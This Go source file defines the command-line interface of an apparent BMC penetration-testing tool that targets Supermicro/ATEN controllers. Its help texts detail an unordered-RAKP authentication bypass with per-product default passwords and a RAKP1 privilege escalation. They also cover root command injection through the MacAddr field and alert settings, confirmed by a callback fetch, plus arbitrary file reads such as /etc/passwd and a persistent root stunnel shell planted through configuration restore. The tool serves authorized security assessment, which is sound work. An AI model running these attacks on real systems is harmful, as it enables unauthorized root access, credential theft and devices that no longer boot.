package cmd

// Top-level Supermicro/ATEN OEM commands.
//
// These drive vendor-specific workflows over the same IPMI stack as `oobscan
// ipmi`, so they take the shared session flags from flags.go and run through the
// shared target loop in ipmi_runner.go. Each command owns only its own options
// and its own help.

import (
	"context"
	"fmt"
	"strings"

	"github.com/spf13/cobra"
)

// runSMCOnTargets runs fn against every target in args. Used by the workflows
// that take no positional arguments of their own, so every argument is a target.
func runSMCOnTargets(cmd *cobra.Command, args []string, fn ipmiSessionFunc) error {
	return runSMCTargets(cmd, args, nil, fn)
}

// runSMCOnTargetWithArgs treats args[0] as the target spec and hands args[1:] to
// fn. Used by smc-read and smc-cdb, which take their own positional arguments;
// multiple targets still work through a comma list, CIDR or range in args[0].
func runSMCOnTargetWithArgs(cmd *cobra.Command, args []string, fn ipmiSessionFunc) error {
	if len(args) == 0 {
		return fmt.Errorf("%s: a target is required", cmd.Name())
	}
	return runSMCTargets(cmd, args[:1], args[1:], fn)
}

// runSMCTargets is the common body: validate, expand, then run one session per
// target through the shared loop.
func runSMCTargets(cmd *cobra.Command, targetArgs, workArgs []string, fn ipmiSessionFunc) error {
	out := cmd.OutOrStdout()
	name := cmd.Name()
	usage := func() { fmt.Fprint(out, cmd.UsageString()) }
	if err := validateIPMIOutputFlags(); err != nil {
		fmt.Fprintf(out, "%s: %v\n", name, err)
		usage()
		return nil
	}
	// --stage-only wins over --apply, so a script that asks for a staged run
	// never commits (and reboots the BMC) because a stray --apply came along.
	if smcUploadOnly && smcApply {
		fmt.Fprintf(out, "%s: --stage-only overrides --apply; the archive will be staged, not committed\n", name)
		smcApply = false
	}
	targets, err := expandIPMITargets(targetArgs)
	if err != nil {
		fmt.Fprintf(out, "%s: target parse error: %v\n", name, err)
		usage()
		return nil
	}
	if len(targets) == 0 {
		fmt.Fprintf(out, "%s: no targets expanded from input\n", name)
		usage()
		return nil
	}
	return runIPMITargets(cmd, targets, name, usage, runIPMISessionStep(cmd, workArgs, fn))
}

// runSMCSessionlessOnTargets runs the RAKP bypasses, which build their own
// handshake and never open a session.
func runSMCSessionlessOnTargets(cmd *cobra.Command, args []string, fn func(*cobra.Command, string) error) error {
	out := cmd.OutOrStdout()
	name := cmd.Name()
	usage := func() { fmt.Fprint(out, cmd.UsageString()) }
	if err := validateIPMIOutputFlags(); err != nil {
		fmt.Fprintf(out, "%s: %v\n", name, err)
		usage()
		return nil
	}
	targets, err := expandIPMITargets(args)
	if err != nil {
		fmt.Fprintf(out, "%s: target parse error: %v\n", name, err)
		usage()
		return nil
	}
	if len(targets) == 0 {
		fmt.Fprintf(out, "%s: no targets expanded from input\n", name)
		usage()
		return nil
	}
	return runIPMITargets(cmd, targets, name, usage,
		func(_ context.Context, idx int, host string, status *ipmiStatusSpinner) error {
			status.Set(idx, host, "running supermicro rakp probe")
			var berr error
			status.WithPaused(func() { berr = fn(cmd, host) })
			return stepErrorf(name, berr)
		})
}

// smcTargetSpec is the shared target-argument description.
const smcTargetSpec = "<host[,host|cidr|range...]|targets...>"

var smcBackupCmd = &cobra.Command{
	Use:   "smc-backup [flags] " + smcTargetSpec,
	Short: "Export and decrypt the Supermicro/ATEN BMC configuration archive.",
	Long: `smc-backup exports the BMC configuration over the Supermicro OEM config
channel (netfn 0x30 cmd 0xA0, the SaveConfig download path) and, when the
config-obfuscation key is known, decrypts it to a gzip tar of the /nv
preserve_config tree. Read-only against the BMC.

The configuration key is selected from the generation detected via the System
GUID; use --config-key when no built-in profile applies. The output is --out
(default smc-backup-<host>.bin), plus <out>.tar.gz when decryption succeeds.
--no-decrypt keeps only ciphertext. Older firmware may have an additional
openssl-enc-salted layer; --config-inner-pass supplies that layer's password.

Backups and recovered passwords are sensitive evidence. Restrict access to the
output and review its contents before sharing it.

Examples:

	oobscan smc-backup -u ADMIN -P ADMIN 10.0.0.10
	oobscan smc-backup -u ADMIN -P ADMIN 10.0.0.10 --out backup.bin
	oobscan smc-backup -u ADMIN -P ADMIN 10.0.0.10 --no-decrypt`,
	Args: cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCOnTargets(cmd, args, runIPMISMCBackup)
	},
}

var smcRestoreShellCmd = &cobra.Command{
	Use:   "smc-restore-shell [flags] " + smcTargetSpec,
	Short: "Stage a certificate-authenticated stunnel shell for break-glass investigation.",
	Long: `smc-restore-shell stages a supervised stunnel root shell for authorized
investigation through the BMC configuration-restore interface. The vendor
classifies this interface as intended functionality; no CVE is assigned to it.

The command exports the current configuration, or uses --from, and embeds a
launcher in a supported configuration member. The launcher persists across
reboots; the running service uses tmpfs. The service requires the BMC's stunnel
binary and pins the operator's client certificate. There is no unauthenticated
Telnet fallback. The listener uses --shell-port (default 4444).

The client identity is loaded from --cert-path (default
~/.cache/oobscan/smcrestore-shell.pem), reused when present, and generated when
absent. Protect this private key: by default the same identity is reused across
deployments. The client permits legacy TLS and does not verify the BMC's server
certificate. Restrict access to a trusted management network.

Without --apply, an archive is uploaded but not applied. With --apply, the BMC
configuration changes and the controller reboots. Review the selected targets
and plan for management downtime. Existing configuration is used as the base;
the DDNS-based deployment path can also enable the configured NTP service.
Local artifacts and connect.sh are written under --out (default smc-shell-<host>/).

Connect with "oobscan smc-shell <host> [port]". Remove investigation access with
"oobscan smc-uninstall" and verify cleanup on the device when work is complete.

Examples:

	oobscan smc-restore-shell -u ADMIN -P ADMIN 10.0.0.10
	oobscan smc-restore-shell -u ADMIN -P ADMIN 10.0.0.10 --shell-port 4444 --apply
	oobscan smc-restore-shell -u ADMIN -P ADMIN 10.0.0.10 --from backup.bin.tar.gz --apply`,
	Args: cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCOnTargets(cmd, args, runIPMISMCRestoreShell)
	},
}

var smcUninstallCmd = &cobra.Command{
	Use:   "smc-uninstall [flags] " + smcTargetSpec,
	Short: "Remove supported stunnel and legacy service launchers from BMC configuration.",
	Long: `smc-uninstall removes a deployed stunnel shell or legacy tailnet service
by stripping recognized launchers and neutralizing their known archive members,
then re-encrypting and restoring the configuration. Without --apply the archive
is uploaded but not applied; applying it reboots the BMC.

This is not a factory reset or restoration of a saved pre-install snapshot.
Separately installed agents and files outside the supported archive paths may
require additional cleanup. Verify that investigation access is removed and
normal management services are available after the reboot.

Examples:

	oobscan smc-uninstall -u ADMIN -P ADMIN 10.0.0.10
	oobscan smc-uninstall -u ADMIN -P ADMIN 10.0.0.10 --apply`,
	Args: cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCOnTargets(cmd, args, runIPMISMCUninstall)
	},
}

var smcReadCmd = &cobra.Command{
	Use:   "smc-read [flags] <host[,host|cidr|range...]> <remote-path> [key=value ...]",
	Short: "CVE-2026-65210: validate BMC file disclosure through the OEMHW1 handler.",
	Long: `smc-read uses the OEMHW1 file handler to stage one remote path in /tmp/filedump
and read it back in bounded chunks. Source data is not changed, but the command
is sent only when the detected or pinned profile advertises file support.

Options are key=value tokens rather than flags, so they do not collide with the
shared session flag namespace:

	out=<file>      write the bytes to this file instead of rendering them
	len=<n>         how many bytes to read
	offset=<n>      start this far into the file
	decrypt         decrypt a Supermicro-obfuscated member after reading
	psblock         decode the read as a psblock record
	chunk=<n>       bytes per request
	delay=<dur>     pause between requests
	profile=<id>    pin the vendor profile instead of detecting it

Without out=, rendered data is limited to 1 MiB.
Read only files covered by the assessment scope; output may contain credentials
or other sensitive configuration data.

Examples:

	oobscan smc-read -u ADMIN -P ADMIN 10.0.0.10 /etc/passwd
	oobscan smc-read -u ADMIN -P ADMIN 10.0.0.10 /nv/PSBlock out=psblock.bin psblock`,
	Args: cobra.MinimumNArgs(2),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCOnTargetWithArgs(cmd, args, runIPMISMCRead)
	},
}

var smcCDBCmd = &cobra.Command{
	Use:   "smc-cdb [flags] <host[,host|cidr|range...]> <enum|inquiry|raw-cdb> [args ...]",
	Short: "Enumerate storage controllers and send SCSI CDBs through the BMC (vendor: intended functionality, no CVE).",
	Long: `smc-cdb reaches the storage behind the BMC over the Supermicro OEMHW1
passthrough.

	smc-cdb <host> enum [controller=<0..3>] [profile=<id>]
	smc-cdb <host> inquiry <controller> <target> [timeout=<ms>] [profile=<id>]
	smc-cdb <host> <controller> <target> <hex-cdb...> [dir=<0..3>]
	        [timeout=<ms>] [profile=<id>] [apply]

enum reads Supermicro's cached controller map and drive identity records; it is
read-only and works across the ATEN generations.

inquiry sends only the standard SCSI INQUIRY CDB and requires a profile that
advertises OEMHW1 passthrough.

Every arbitrary raw CDB is a DRY RUN until the bare apply token is present;
known destructive opcodes are labelled before the request is built.

Examples:

	oobscan smc-cdb -u ADMIN -P ADMIN 10.0.0.10 enum
	oobscan smc-cdb -u ADMIN -P ADMIN 10.0.0.10 inquiry 0 0
	oobscan smc-cdb -u ADMIN -P ADMIN 10.0.0.10 0 0 12 00 00 00 24 00 apply`,
	Args: cobra.MinimumNArgs(2),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCOnTargetWithArgs(cmd, args, runIPMISMCCDB)
	},
}

var smc0014Cmd = &cobra.Command{
	Use:     "smc-rakp-bypass [flags] " + smcTargetSpec,
	Aliases: []string{"smc-0014"},
	Short:   "CVE-2026-65219: validate the ATEN unordered-RAKP authentication bypass.",
	Long: `smc-rakp-bypass validates an unordered RAKP state machine: Open Session followed
directly by RAKP message 3, with message 1 never sent. Message 1 is the only
writer of the session slot's bound user id, console random, role byte and
username length, so on a slot that has not been allocated since boot those are
all boot values and the whole message-3 transcript is known.

Use only with explicit authorization to test authentication bypass. The command
constructs its own handshake and does not use -u/-P.

The only unknown is user record 0's stored password, which is SHORT AND
PER-PRODUCT rather than shared across the product line: recovered live as "0" on
X11DPT-PS, "admin" on X10DSC+ and the EMPTY STRING on H13, or the CVE-2026-18449
firmware constant on a unit with SMCRAKP mode enabled. The candidate order is
chosen from the generation detected in the sessionless System GUID;
--record0-keys overrides it.

PRECONDITION: it needs a session slot no RAKP message 1 has ever landed on,
which in practice means shortly after a BMC reset or on a lightly used board. A
sweep with no cold reset found nothing on eight lab units.

Attempt budget: on X11/X12/X13/H13 a rejected candidate charges a
bad-password record against user record 0, and the lock check runs AFTER the
authentication-code compare - so once the (config-defined) threshold is reached,
the CORRECT key is answered with the same 0x08 as a wrong one. Measured on H13
FW 01.03: threshold 3, lock clears in under 32s on its own, no reset needed.
Only ONE candidate per run is sent by default; --record0-max-attempts raises it
and --record0-rest 60s makes a multi-candidate run interpretable again. X10 FW
4.00 has no lockout call in its RAKP3 path at all and sweeps the whole list in
one run. A run that cannot support "not vulnerable" is reported INCONCLUSIVE,
never clean.

Impact when it works is SOL - an interactive console on the managed host's
serial port - and NOT full administrative IPMI. Record 0's IPMI-messaging bit is
clear, so the session is confined to a narrow command lane and raising its
privilege to Administrator does not widen it. The default path runs a READ-ONLY
capability probe; SOL activation is opt-in via --activate-sol (and is
deactivated again afterwards).

--probe-only stops after a detection probe that sends one deliberately wrong
authentication code without obtaining a session. It can still increment the
record-0 failure counter; it is not a zero-impact or passive test. The echoed
console session ID and response status provide evidence of the ordering defect.

Not affected: Supermicro X14 (OpenBMC netipmid), a different stack that answers
the unordered message 3 with the spec-correct status 0x0f.

Examples:

	oobscan smc-rakp-bypass 192.0.2.10 --probe-only
	oobscan smc-rakp-bypass 192.0.2.10
	oobscan smc-rakp-bypass 192.0.2.10 --record0-keys 0,admin,smcrakp --activate-sol`,
	Args: cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCSessionlessOnTargets(cmd, args, runIPMISMC0014)
	},
}

var smc0015Cmd = &cobra.Command{
	Use:     "smc-priv-esc [flags] " + smcTargetSpec,
	Aliases: []string{"smc-0015"},
	Short:   "CVE-2026-65220: validate ATEN RAKP1 privilege escalation with a test account.",
	Long: `smc-priv-esc tests whether a low-privilege account can obtain Administrator
access through RAKP message 1. The affected implementation
dispatches on the upper nibble of the role byte and implements only 0x0x and
0x1x, so every nibble from 0x2 to 0xF falls into one residual arm that copies
the slot's existing privilege over the per-user clamp. Message 1 needs no
credential, so one message 1 naming an Administrator account seeds privilege 4
and a second with the reserved role naming the low-privilege test account
inherits it.

It runs before any session is opened and does not use -u/-P.

This requires a valid low-privilege test credential and explicit authorization
to test privilege escalation. Message 3 is signed with
--low-pass, that account's actual password. It is a privilege escalation, not
an authentication bypass. It is proven with a privileged READ (Get User Access),
not with the Set Session Privilege Level oracle, which on this stack reports a
level that does not always reflect real authorization. Both controls are run and
reported: no Administrator seed, and an Administrator seed with a
spec-conformant role lookup (0x12).

The Administrator/Operator CEILING is measured, not assumed. A command counts as
an administrator witness only if an Operator-privilege session is refused it
0xd4 AND a real Administrator session is granted it 0x00, so settling the ceiling
needs --op-user/--op-pass and --admin-pass. Without them the verdict is reported
as administrator WITH the caveat that no witness was validated - it is never
downgraded to operator on the strength of a command the firmware may refuse to
everyone. On H13 FW 01.03 no read-only command separates the two at all: an
Operator is granted every user-config read a USER account is refused, and Get
Device SDR Info is refused even to a real ADMIN.

--probe-only measures whether the reserved role byte is accepted and needs no
credential.

Supermicro X14 uses a different OpenBMC implementation and is excluded from this
ATEN reserved-role validation.

Examples:

	oobscan smc-priv-esc 192.0.2.10 --probe-only
	oobscan smc-priv-esc 192.0.2.10 --low-user lowpriv --low-pass Secret123 --admin-user ADMIN
	oobscan smc-priv-esc 192.0.2.10 --low-user lowpriv --low-pass Secret123 \
		--op-user operator --op-pass Op123 --admin-pass AdminPass`,
	Args: cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCSessionlessOnTargets(cmd, args, runIPMISMC0015)
	},
}

var smc0021Cmd = &cobra.Command{
	Use:     "smc-x14-cmdinj [flags] " + smcTargetSpec,
	Aliases: []string{"smc-0021"},
	Short:   "CVE-2026-65213: confirm the X14 RestorePSOOBBFile MacAddr root command injection.",
	Long: `smc-x14-cmdinj validates the X14 (OpenBMC) OEM out-of-band file-apply handler
RestorePSOOBBFile: the uploaded XML's Networking/MacAddr "value" attribute is
passed to the MAC-setting routine with no validation, quoting or escaping, and
that routine appends it to the fw_setenv macaddr command (and ethaddr) and runs
it through popen as root.

The whole chain is exercised: reserve an upload slot, start the upload, send the
document in chunks, then apply action 0x05, which dispatches the handler in a
detached thread. Because the apply reply returns before the injected command
finishes, confirmation is out of band: the payload fetches a URL on the local
callback listener, and/or writes a marker file with id(1) output. The callback
hit - with the source address, which is the BMC - is the proof.

This test writes the U-Boot environment. fw_setenv does not validate
macaddr or ethaddr values, so a substitution that evaluates to an empty or wrong
value is written to the U-Boot environment verbatim, persists across reboots, and
can stop the BMC from booting. The payload therefore always echoes back a valid
MAC: the --mac value, else the target's own MAC resolved over IPMI (LAN config
param 5, then the PS OOB backup export), and it refuses to run when neither
yields one. Everything before the trailing echo emits no stdout, so fw_setenv
receives the resolved MAC. An explicit --mac must match the device's intended
address. Incorrect values can disrupt management access or prevent boot.

--probe-only uploads a test document but does not apply it. This validates the
transfer chain, not whether the vulnerable apply handler can be reached.

X14 only. The ATEN generations (X9 through X13, H13) ship a different 0x30/0xA0
dispatcher with no RestorePSOOBBFile handler.

Examples:

	oobscan smc-x14-cmdinj -u ADMIN -P ADMIN 10.0.0.10 --probe-only
	oobscan smc-x14-cmdinj -u ADMIN -P ADMIN 10.0.0.10 --callback-host 10.0.0.5 --apply
	oobscan smc-x14-cmdinj -u ADMIN -P ADMIN 10.0.0.10 --mac ac:1f:6b:5b:46:ce \
		--marker /tmp/oob_0021 --apply`,
	Args: cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCOnTargets(cmd, args, runIPMISMC0021)
	},
}

var smc0022Cmd = &cobra.Command{
	Use:     "smc-alert-cmdinj [flags] " + smcTargetSpec,
	Aliases: []string{"smc-0022"},
	Short:   "Investigate an unconfirmed ATEN alert command-injection lead (no CVE).",
	Long: `smc-alert-cmdinj investigates the ATEN libipmi.so alert-delivery sinks: stored,
administrator-supplied configuration strings are concatenated into an outbound
shell command and run as root when an alert fires.

Status: Supermicro did not reproduce this on matching hardware and no CVE was
assigned. The runZero Lights Out post lists it as an unreproduced lead
(https://www.runzero.com/blog/lights-out-exposed/#unreproducable-supermicro-findings).

Two sinks are covered:

  smtp    OEMGetSetSMTPSetting (NetFn 0x30, command 0x68, subfunction 0x06)
          stores the server, user, password and sender. SMTPClientSend then
          builds the msmtp command line with the host, user and sender
          arguments unquoted, the password inside a single-quoted
          passwordeval, and runs it through popen. X10 4.00 stores all four
          fields verbatim; X13 2401MS 01.07.01 and H13SSF E401MS 01.09.16 store
          only the server field unescaped (System Lockdown must be off, which
          is the default). X11 and the other generations escape or stub the
          setter, which the command reports as a negative rather than a failure.

  snmp    The web SNMP configuration handler cgilib_config_snmp stores the
          SNMPv3 trap username with no filter and the auth/privacy passwords
          behind only an unchanged-password placeholder check, and
          PETSnmpTrapV3 formats them into the snmptrap command (unquoted, via a
          /bin/sh -c wrapper) plus an snmpget engine probe. X11, X12, X13,
          X13-DAI, H13 and H13SSF are affected; X10 has no snmptrap execution
          at all.

Both sinks are blind: the injected command runs in the alert task, so success is
confirmed out of band. The payload fetches a URL on the local callback listener
and writes a marker file; the callback hit is the proof. The IPMI Alert
Immediate trigger (NetFn 0x04, command 0x16) forces delivery, and the set fields
are read back so an accepted value is distinguished from one the build validated.

Without --apply the run is a STAGED DRY RUN: it reads the current SMTP and SNMP
state and prints the exact requests it would send, and transmits no setter, no
POST and no alert trigger.

Examples:

	oobscan smc-alert-cmdinj -u ADMIN -P ADMIN 10.0.0.10
	oobscan smc-alert-cmdinj -u ADMIN -P ADMIN 10.0.0.10 --sink smtp --apply
	oobscan smc-alert-cmdinj -u ADMIN -P ADMIN 10.0.0.10 --sink snmp --web-pass ADMIN \
		--callback-host 10.0.0.5 --apply`,
	Args: cobra.MinimumNArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		return runSMCOnTargets(cmd, args, runIPMISMC0022)
	},
}

func init() {
	// Config-archive workflows: session + the config crypto group, then each
	// command's own destination and commit semantics.
	for _, c := range []*cobra.Command{smcBackupCmd, smcRestoreShellCmd, smcUninstallCmd} {
		registerIPMIAllSessionFlags(c)
		registerSMCConfigCryptoFlags(c)
	}

	registerSMCOutFlag(smcBackupCmd, "output path for the exported blob (default smc-backup-<host>.bin); the decrypted tree is written to <out>.tar.gz")
	smcBackupCmd.Flags().BoolVar(&smcNoDecrypt, "no-decrypt", false, "save only the encrypted blob, do not decrypt")

	registerSMCFromFlag(smcRestoreShellCmd)
	registerSMCOutFlag(smcRestoreShellCmd, "directory for the generated client cert/key + connect.sh (default smc-shell-<host>/)")
	registerSMCApplyFlags(smcRestoreShellCmd, "COMMIT the restore (this reboots the BMC and activates the service); without it the archive is only staged")
	registerSMCShellServiceFlags(smcRestoreShellCmd)
	registerSMCCertPathFlag(smcRestoreShellCmd)

	registerSMCFromFlag(smcUninstallCmd)
	registerSMCOutFlag(smcUninstallCmd, "directory for the rebuilt archive and its receipts (default smc-uninstall-<host>/)")
	registerSMCApplyFlags(smcUninstallCmd, "apply the cleaned configuration and reboot the BMC; without it the archive is only uploaded")

	// Read-only inspection: session flags only, options are key=value tokens.
	registerIPMIAllSessionFlags(smcReadCmd)
	registerIPMIAllSessionFlags(smcCDBCmd)

	// RAKP bypasses: transport and output only, no credential group.
	for _, c := range []*cobra.Command{smc0014Cmd, smc0015Cmd} {
		registerIPMITransportFlags(c)
		registerIPMIFormatFlag(c)
	}
	registerSMC0014Flags(smc0014Cmd)
	registerSMC0015Flags(smc0015Cmd)

	// Command-injection validators: both open an authenticated session, so they
	// take the full session group plus their own confirmation-channel options.
	for _, c := range []*cobra.Command{smc0021Cmd, smc0022Cmd} {
		registerIPMIAllSessionFlags(c)
	}
	registerSMC0021Flags(smc0021Cmd)
	registerSMC0022Flags(smc0022Cmd)

	rootCmd.AddCommand(
		smcBackupCmd,
		smcRestoreShellCmd,
		smcUninstallCmd,
		smcReadCmd,
		smcCDBCmd,
		smc0014Cmd,
		smc0015Cmd,
		smc0021Cmd,
		smc0022Cmd,
	)
}

// smcCommandNames lists the top-level Supermicro commands, for the root help and
// for the test that keeps naming consistent.
func smcCommandNames() []string {
	var names []string
	for _, c := range rootCmd.Commands() {
		if strings.HasPrefix(c.Name(), "smc") {
			names = append(names, c.Name())
		}
	}
	return names
}
